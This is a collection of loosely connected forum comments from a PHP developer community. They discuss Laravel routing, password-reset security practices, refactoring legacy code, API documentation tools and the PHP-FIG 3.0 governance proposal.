Is it easy to store JS variables from the page into Piwik/GA?
Why not all of them?
Give it a bash, to ghet my head into a language I always make myself a small blog + admin panel for it and see what I like/dislike and see what I done wrong to improve. 
Yes, Piwik will let you store custom JS variables. What "JS variables" are you interested in tracking? Most of the fields you are asking about are already included out of the box with Piwik. 
Yes, it has a straightforward JS API for tracking whatever else you need
It deals with object creation, hence factory. &gt; Get your patterns straight. Right back at you.
I don't agree with all of Phil's opinions, but he is right with this article. Declaring your results in one place instead of it automagically happening is a lot better. First of all it provides documentation. Second it provides more security over something like codeigniter's way of auto matching functions to endpoints which can lead to exposing methods that shouldn't have been. I have a very large laravel app with ~1000 routes and I declare every single route individually. I split the routes file into one for each module and include them in the parent. It is entirely manageable and it's nice to see a list of all the endpoints available all at once, rename them individually, etc. 
FWIW I agree with you. I have done a lot of wrestling with Laravel and I see a lot of room for improvement.
Could you elaborate more on why defining routes is always the way to go? I've bounced back and fourth, first liking, then hating, then liking automatic routing from controllers. Just looking for some info on why one is better/worse than the other.
&gt; So, first and foremost, empower your users to choose convenience or security. Ask them &gt; , "Do you want to be able to regain access to your account if you ever forget your password?" &gt; **and default to "No"**. This is going to end badly for *most* people. It's certainly the most secure policy, but for the typical web app it's going to lead to far more unhappy customers with an un-solvable problem than it will security-conscious customers who appreciate not having to uncheck a box in their settings page. But on a technical level this all seems like good advice, which is typical of Paragonie. 
apparently you weren't around when this was actually valid notation.... *shivers* The days of $myObject.object = 1; 
Some people have to do things the very hard way.
I think the complaint is there is a lot of plumbing in there for the sake of plumbing. Laravel drives me nuts as well. I'm more likely to go bare bones PHP to build some things because I just don't need all the overhead.
true :-) i was joking with mind of "having sex" with technology. I don't know if people in english use "to have sex" in such context. In Russian there universal word for it... It means to spend days and nights with it and do repetitive moves. For Ukraine, Russia $100k/year is a lot. When it's ok for USA programmer to make $100/hour in Russia or Ukraine it's almost unreal. Best of the best making near $60/hour. I mean on average. I personally occasionally make more than $100/h) but it doesn't count. In Ukraine some people make $100 per month. And even some programmers make $300 per month working for bank. So here positioning yourself and choosing your level of pay is more important than coding skills. It may make difference up to 30 times. Of-course technology and skill are important but it doesn't guarantee fair pay as for USA. So it's important to not just be good with what you do. But also selecting what to do and for whom.
&gt; It's certainly the most secure policy, but for the typical web app it's going to lead to far more unhappy customers with an un-solvable problem than it will security-conscious customers who appreciate not having to uncheck a box in their settings page. Maybe not "un-solvable": If it's stored a boolean field in a database table, emailing support to ask for it to be re-enabled will solve that inconvenience. You don't have to default to No on this one, but if in doubt, it's what we recommend for people who want more security. Defaulting to Yes is fine, as long as the choice is presented in the first place. (That, in and of itself, is a huge gain over what most platforms offer.) Defaults matter more than people think they do, but if it means the difference between "having 3 support staff" and "having 30 support staff", I can't fault anyone for choosing to make password resets opt out. &gt; But on a technical level this all seems like good advice, which is typical of Paragonie. Thanks! EDIT: I've updated the post to make this "default to no" sound less mandatory than it did in the earlier version of the page.
To me it's just gives you much more control over your system.
Reddit is hard and I can't figure out how groups work apparently.... Thanks for all of the relatively kind/not too harsh comments for this stupidity.
yea...
If it's not broken don't fix it. Start by writing unit test/integration tests then incrementally refactor until it becomes maintainable.
Thanks! I read your answer carefully and will read it again carefully tomorrow!
I don't think I get it, really. With Yii you can run a command/script/something and then Models, Controllers and Views are generated all in one go?
Basically, yes. You run one operation to generate Models from your database's tables. The attributes and validation rules are automatically generated, based on column types and the restrictions you put on those columns. Model relations are created based on your foreign keys (or specific comments, if foreign keys are not supported). Yii's models use the ActiveRecord pattern, which makes database tables very easy to translate to models. Then you run another operation, to generate Controllers and Views from those Models. By default, you get one Controller and a bunch of views for each model. Each controller comes with a grid view, showing all available records. There's also forms to create/update/delete specific records. All the necessary form fields are inferred from the model's attributes (which, in turn, come from your table's columns). The end result is pretty barebones, but it's absolutely trivial to edit the views and controllers to suit your own needs. The generated forms are best used in back-end systems, but the generated models are suitable for front-end use as well.
Ok so if you are curious I can help you: 2 team worked on the project before today. First team built it's own undocumented(?) tool box (framework?) over zend framework and added some homemade compilation and tricks. Second team tried to avoid using this and wrote raw php (and modified some functions and classes) on top of this framework(?) in public directory for two years. Both teams think the other one is wrong (I spoke quickly with some in both). I have now some kind of messy code. I think nobody is guilty, but I have some work now :)
http://www.phpthewrongway.com/
I don't think I like the idea, but I can see why some might find it useful. But thank you for taking your time to explain the concept for me.
I've been doing, among other things, JS SPAs over PHP RESTful backends for quite a few years now. I don't think pointing out the size and variety of the tech stack makes any valid point. You're going to need a lot of the stuff you mentioned anyway, because you're gonna have some degree of JavaScript even in traditional multi-page server-rendered web applications. You will need a server side runtime (PHP instead of Node), you will need a package manager (Composer instead of NPM), you will likely use a framework for DI/routing/dispatching/filtering/persistence/rendering etc (or a collection of libraries, unless you really want to reinvent everything), you will need to write some JavaScript (assuming that you can endure ES5 after having worked with TypeScript, or even ES6 for that matter), you will need to bundle js code among your assets, so you will need some kind of task automation (Make/Phing/Ant instead of Gulp/Grunt/Webpack, assuming simple shell scripts are not enough), you will need a unit testing pipeline (PHPUnit, Mockery, Prophecy, PHPSpec, Assert... you name it.), and you will still need to run e2e tests in a browser (I can only think of Selenium instead of PhantomJS). Realistically, you will likely end up with a `package.json` even when not actually developing an SPA or a Node application. If your product runs on a browser, you will have some JS at some point, and if you have some JS, you might as well take advantage of the entire ecosystem. But that's beside the point: even if you went with completely JS-less code (which I can hardly imagine these days unless you're just doing tools, web services, or things that don't run on a browser), you're screwed: whether you like it or not, tech stacks have gotten huge. The more commonly used, the more fragmented they are, so you will be overwhelmed by the sheer quantity and variety of third party code that will land on your development environment. SPAs over RESTful is just a paradgm, so like any other architecture it has trade offs and it's not a silver bullet. In my experience, it is certainly more complex and expensive than the traditional web application architecture. The bottom line is: **you have to know your tools, but they're just tools. The choice is subjective, pick whatever you fancy. Architecture and design decisions, instead, need rational thought driven mostly by requirements, not tech bandwagons**.
Thank you!!
Fine by me-- I've just rewritten a program using laravel hoping to gain versatility and structure and felt like it fought me the entire way. Just keeping it from 500-ing on simple queries that the previous raw php version handled fine was infuriating. I also agree about directory structure. Oh well, it's working now and it'll stay Laravel for the foreseeable future.
If you never believed you had the capability, your commentary on its feasibility (as quoted) would be irrelevant, ergo your election to include such commentary is evidence of your ego.
&gt; Having to define your routes is ALWAYS the way to go, if nothing else but from a security perspective. Absolutist statements like this are incorrect and take away from your point. To prove it, a couple counterexamples: * You're developing a prototype and your primary goal is time to market (read: development speed). Having Rails-esque magic speeds things up * Forcing developers to follow conventions generally leads to more consistency since they have less control; a framework-enforced routing convention helps with this * You have a large team. The file with route definitions becomes more prone to version conflicts * Unless your framework (or the way you use it) is hideously broken, there is absolutely no security advantage * Convention-driven routes tend to be less error-prone in the actual request handling (never forgetting to check in the routes file changes, for example) I happen to agree that explicitly defined routes are the better choice most of the time (there are also *tons* of downsides, and at least for the work I do, they outweigh the positives), but saying "always" in programming usually just leads to bad assumptions.
I knew it was around 100 days away by all the green trees I saw in Costco last week.
&gt; Maybe not "un-solvable": If it's stored a boolean field in a database table, emailing support to ask for it to be re-enabled will solve that inconvenience. Every time I implemented a password recovery, some sort of administrative user management tool was also involved, and a "send password reset link" functionality was somewhere. User preferences should not influence what an administrator can or can't do for the user.
Yep, I got that. It's me who was unclear, probably. What I meant is that if you have a user authentication system, you probably also have an elevated user management system, so re-enabling such option and let the user make the request is not necessary: an administrator should be able to make the same action on his behalf, if the user inquire is authenticated via other means, of course.
I think the status quo and the proposed 3.0 suffer the same drawback. Not that I have the answer(s) for this problem, but I think it could be chaos if opened up to anybody who can click a button. Design my committee and all that... :/
What the post describes would effectively put the onus on humans to make judgment calls based on the information available, which is generally harder to game than an automated trust decision (i.e. humans are less deterministic than computers), especially if you train the humans involved in the process to identify and resist social engineering tactics. Hacking someone's email account and requesting password resets to be re-enabled, only to receive a GPG-encrypted blob that you can't decrypt, would still frustrate most attackers.
Refactoring legacy application is honestly the cornerstone of most of my development. I will try to keep this short, I have no idea if it'll help you, though. Here is my method in a nutshell (on the fly right now), when I am required to fix bugs and potentially add features as I go: **Information Gathering:** 0. Use it, use it a bunch. Get familiar with it. Does it feel slow? Sluggish? is it ugly? know it, and know how people are using it 1. Identify the core functions of the system 2. Identify if they are actually working as intended (you will find, many times, they are buggy to begin with) 3. If they are functioning as intended, try to understand the original requirements because the staff may be unaware they are not actually functioning as they thought 4. Identify the entry points for those core functions from the user first perspective 5. Identify the entry points for those functions in code 6. Attempt to understand how they carry out the functions 7. Review the schema, make sure the thing is indexed properly, know where items end up, check if its normalized, etc. 8. Identify how it runs (stack requirements) **Initial Pass** 1. Automate the deployment, know the conditions in which it needs to run (this is important since you'll be making changes without tests backing most of them) 2. No tests!? Tests are very hard to write for legacy code. I don't write them on initial pass, because most of the time, the defined behavior of a certain complex part of the system as given is wrong (they never met the requirements anyway, users just figured it did. As you fix it, the new behavior is actually unexpected, when in reality, it matches the requirements) * 3. Collect initial bugs, start fixing them. Do some localized cleanup as you go. This is important, so you can A) make sure deployment works, B) become familiar with the monster **I'm pretty familiar with it now** 1. You've been fixing bugs, you know the big mess spots. You also probably have seen by now that there were bugs, and the users couldn't see them or coped with them some other way. 2. Start encapsulating those core functions if they are not already. Move them into classes, and, using your knowledge. Now write tests for all this shit - since it's testable 3. Add automatic testing to your deployment process (Make sure to mock the database) 4. Do this for all the fat guys 5. If your views are tightly coupled to strange output from these functions that varies, write transformers for now or fix the views as you go **I feel I know this hideous beast, and all its secrets** 0. You should be fine at this point, keep on going through it. You should be intimately familiar with the system now. Backed by tests and understanding of the core functionality, you should be able to elegantly bring refactoring into your workflow. 1. Start removing bad code regions, dead code regions, overlapping functionality (Negotiate merging functionality) 2. Find copy pasted code, identify its use, try to converge all their entry points 3. Negotiate features which are unused, remove them or ask for new official requirements on the features functionality, write tests for it 4. You will most likely find yourself refactoring all the views to go with the new backend code. This is frequently what I see in legacy systems. So while you're there, merge common information into partials and remove them Embrace the shitty code. Bring your refactoring and fixes right into your workflow and quote them extra time. We got a set of requirements to add in some permission restrictions for certain user groups. To us, it could be a 1 day fix. However, why not take this time to fix the entire messy ACL structure? Take the harder path. * I don't do functional tests during the initial phase. Often, there is so much backend to mock to get to this point I cannot be sure it would be exact on production. This will vary case by case, but on the systems I dealt with, it would not have been the best use of time to try to get this much coverage while still maintaining the application and fixing bugs, adding features, etc. It just depends.
customer support should have a proper procedure to authenticate users without a password, but that is an entirely different problem.
&gt; Elitist down votes in 3...2... You could try not sounding like an advertisement. 
If you're already using Laravel for your app absolutely. Instead of writing a bash script, authenticating with s3 manually, etc you just run php artisan backup:run I don't really see the downside of it unless your database is several GB in size.
Given PSR-4, you can put Controllers and Models wherever you want and they'll autoload fine. The only thing you'll need to do is tell the template engine where to find each module's view files, which you could do easily using either individual service providers, or a single one if your modules all follow the same structure. I personally modularize routes, controllers, and views in this way (models are business logic and should be separate, in my opinion). You could add whatever logic you wanted to them, though.
&gt; I strongly believe that all changes when the mission shifts to we participate and this is how YOU all should/will code. This is not really the case. Plenty of contributions to past PSRs have come from people without the need of representation from or affiliation with any member project. The only authoritative figure so far has been the Editor, which could very well not be a project representative, and the whole point of Working Groups is to allow more people getting involved in the process. More to the point, PSRs will still be nothing but recommendations: people will always be free to follow them or not, I don't see anything changing in this respect. 
Okay, okay, caveat time: I hate CI's auto-routing and it has left a severely bad taste in my mouth to the point where the mere concept rustles my jimmies. I don't agree with some of what you said but I'm not really in the mood to argue. Long story short, I had some bad experiences and now I'm heavily biased.
It's a scripting language that has been bloated to the point of obscurity that they now want to turn into a religion. Yet another symptom of the massive tech bubble.
API Blueprint all the way. It might only seem complicated but try to spend some time to understand it, it's actually pretty simple. There are cool tools for it like https://github.com/danielgtaylor/aglio that turn API blueprint text file into an awesome HTML api docs page. And the coolest thing is that you can test your by using your API blueprint file, check this out https://github.com/apiaryio/dredd If you don't want to use Dredd. You can write standard behavior tests using e.g. behat, they should be enough for API if you cover all cases, if it's not some super serious app, you can get away by using only those (yep, no unit tests) 
FWIW I'm going to go and implement the split-token reset. I was using single CSPRNG tokens, but adding additional security that an end user won't notice is always good. Any advice on using email addresses, not usernames, on the password reset screen? (And before you say 'DONT DO THAT', it's a business requirement from on high.)
First, the PSR will still remain recommendations: nobody can force you to use them. Second, the FIG 3.0 proposal has many points towards inclusion: the working groups are larger (up to at least 5 members, and still not restricted to FIG members); the CC can be voted by anyone that participated in the FIG; the PSR can still be proposed and worked by anyone, only the sponsor must be a FIG member. 
Yes, I suppose I should. It was only meant as a placeholder while developing.
I don't have the time to argue the point either - OP must never have had a security audit so doesn't care where the params come from. Or only creates the simplest of apps and using the "magic" auto-generated code is enough. I feel your pain - been there. But no more. Symfony routing with @annotations is freaking awesome and I can rest easy knowing my apps will pass any audit while the old-schoolers around here still using Cold Fusion or homespun, 2003-style PHP scripts will get dinged, floundering for a solution. 
That's fair. Like I said, I agree that I also prefer more manual routing approaches, but there are almost no one-size-fits-all solutions in programming.
Something like [THIS](http://volume.demo.agriya.com/product_demo/music/index.html) would be awesome but since the site is for charity and I am currently not working, I can't spend the money. 
&gt; Or the world will go on, some PHP code will get written along with the hundreds of other languages, and all will be fine. Don't need FIG 3.0 (or any FIG at all) for that. ;-)
Can you post a query that causes a 500 error?
Anything with a result set over 50k. I was forced to chunk result sets where I had no problems before. 
Pulling 50,000 records without chunking or using a cursor is probably going to rough on any DBAL. Thanks for sharing.
Let me add-- this is using same nginx and php.ini settings 
It's fine. Just if they enter any email address, whether it exists in the system or not, make sure you return a positive response. So they enter "does@not.exist" and it says "An email was sent!" even though none was actually sent (or you could still send an email that says there's no user matching that email). Note that I would do this even for a username based password reset screen.
If you want simplicity, use Lumen instead or go back to Code Igniter or vanilla PHP or whatever. Also, your comparison with .NET is bizarre until you can actually explain what you meant by this.
&gt; If the FIG were to become the self declared official PHP standards body, they will soon evolve from suggested recommendations to true standards. This is part of the problem, and one of the things that FIG 3.0 has made a decision on - are we still going to be just for the member projects, or are we going to start defining standards that can be (not must be) adopted by the overall community. FIG 3.0 is going the route of full on standards body. Why? The sentiment shared by many people, including myself, is that the PSRs are being adopted outside of the FIG members anyway, and are becoming de facto community standards, regardless of the fact that we create PSRs just for the member groups. &gt; I'm completely for standards. The issue is that the FIG is self appointed and not held accountable to a community in which some seek to influence within the "grand vision". I didn't vote for any Voting Members, so how are my interests being fairly represented? It depends. Your interests could be represented if you wanted. Anyone right now is able to comment on or even start creation of a PSR. Nothing has stopped that before today. You simply had to have a sponsor, which needed to be a FIG member. Most (and I know not all) developers have some sort community that they belong to, be it Drupal, Zend Framework, Aura, React, Sculpin, whatever, that they can also go through to enact change via a direct vote. So while you don't have voting powers, you can still get involved. FIG 3.0 core committee members can be anyone in the community, unlike right now where you have to be affiliated with a project. There will still be member projects, but they won't be the sole voters anymore. The new working group structure still gives non-member projects and non-core committee members voices to help shape PSRs. And as for "who can watch the watchmen?", or who can vote on core committee members and member projects, there isn't any feasible way that the entire PHP community can democratically vote. That's why FIG has the concept of member projects in the first place. Just like with the US democratic system, the member projects has representatives that cover a good chunk of the PHP community as best it can be covered. FIG is, for better or worse, an extension of how the language itself is ran - without any specific person in power and as democratically as possible. Between the working groups, the member projects, and the ability for normal people to be elected to the core committee, I'm not sure how much more you can open this up to people. Is FIG 3.0 a gift from the gods when it comes to organization? Nope. Is it better than what we have right now? Yes. Can we change it in the future as developers and our needs evolve? Of course. That's what is happening right now. When the PSR group was created, the PHP ecosystem did not play well together. It didn't really need to though, because we all cobbled everything together ourselves. As frameworks became more popular, the framework authors themselves saw a need for interoperability. In true PHP fashion, they decided to do create standards for themselves without asking, in a room, without oversight. They would start making PHP Standards Recommendations. And the overall community **revolted**, even before a standard was completely fleshed out. How dare this group of developers from their ivory tower tell us what to do? Eventually they renamed it to FIG, to better show that the standards were meant to govern the member projects, not the community. Since they had released PSR-0 under the previous group's title, they decided to keep the standards themselves called PSR-X. They lived in a bubble for a long time. A bubble which exists today in our mailing list, which anyone is allowed to join. Over time, things like PSR-0 and Composer helped the code sharing, and by extension, the PSRs that were getting created. Full stack frameworks started to fall out of style, but the PSRs didn't. Libraries started to adopt PSRs, and by extension so did the projects that implemented them. The PSRs that FIG created went out into the open world into the general community. And they started being adopted by non-FIG members. And here we are today. The landscape has changed from that php|tek where the original PSR members started. Why should FIG stagnate, hiding behind the cloak of "in _my_ day..."? I think that FIG should evolve with time. Maybe not under the _name_ of FIG, but just like going from 2.0 to 3.0, eventually we can go to 4.0, and maybe even 5.0, as times change. But not 6.0, because that is a silly place. 
Simplicity is not the absence of features. Compare 4.2 docs with master and you can see the metamorphosis. Laravel and .NET MVC are strikingly similar in both structure and methodology.